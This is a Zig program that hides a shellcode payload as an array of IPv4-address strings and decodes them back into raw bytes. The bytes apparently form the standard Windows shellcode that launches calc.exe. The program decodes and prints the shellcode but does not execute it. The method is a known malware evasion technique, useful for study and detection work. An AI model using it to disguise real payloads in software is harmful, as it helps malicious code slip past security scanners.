const std = @import("std");
const net = std.net;

const IPV4_ARRAY: [49][]const u8 = [_][]const u8{
    "252.232.130.0",
    "0.0.96.137",
    "229.49.192.100",
    "139.80.48.139",
    "82.12.139.82",
    "20.139.114.40",
    "15.183.74.38",
    "49.255.172.60",
    "97.124.2.44",
    "32.193.207.13",
    "1.199.226.242",
    "82.87.139.82",
    "16.139.74.60",
    "139.76.17.120",
    "227.72.1.209",
    "81.139.89.32",
    "1.211.139.73",
    "24.227.58.73",
    "139.52.139.1",
    "214.49.255.172",
    "193.207.13.1",
    "199.56.224.117",
    "246.3.125.248",
    "59.125.36.117",
    "228.88.139.88",
    "36.1.211.102",
    "139.12.75.139",
    "88.28.1.211",
    "139.4.139.1",
    "208.137.68.36",
    "36.91.91.97",
    "89.90.81.255",
    "224.95.95.90",
    "139.18.235.141",
    "93.106.1.141",
    "133.178.0.0",
    "0.80.104.49",
    "139.111.135.255",
    "213.187.240.181",
    "162.86.104.166",
    "149.189.157.255",
    "213.60.6.124",
    "10.128.251.224",
    "117.5.187.71",
    "19.114.111.106",
    "0.83.255.213",
    "99.97.108.99",
    "46.101.120.101",
    "0.0.0.0"
};
const NUMBER_OF_ELEMENTS: usize = 49;

fn ipv4Deobfuscation(ipv4_array: []const []const u8, allocator: std.mem.Allocator) ![]u8 {
    var buffer = try allocator.alloc(u8, ipv4_array.len * 4);
    var offset: usize = 0;

    for (ipv4_array) |ip| {
        const addr = net.Address.parseIp4(ip, 0) catch return error.InvalidIpFormat;
        const ip_bytes = @as([4]u8, @bitCast(addr.in.sa.addr));
        @memcpy(buffer[offset..offset + 4], &ip_bytes);
        offset += 4;
    }

    return buffer;
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const shellcode = try ipv4Deobfuscation(&IPV4_ARRAY, allocator);
    defer allocator.free(shellcode);
    std.debug.print("Decrypted shellcode length: {}\n", .{shellcode.len});
    std.debug.print("Decrypted shellcode: {any}\n", .{shellcode});
}
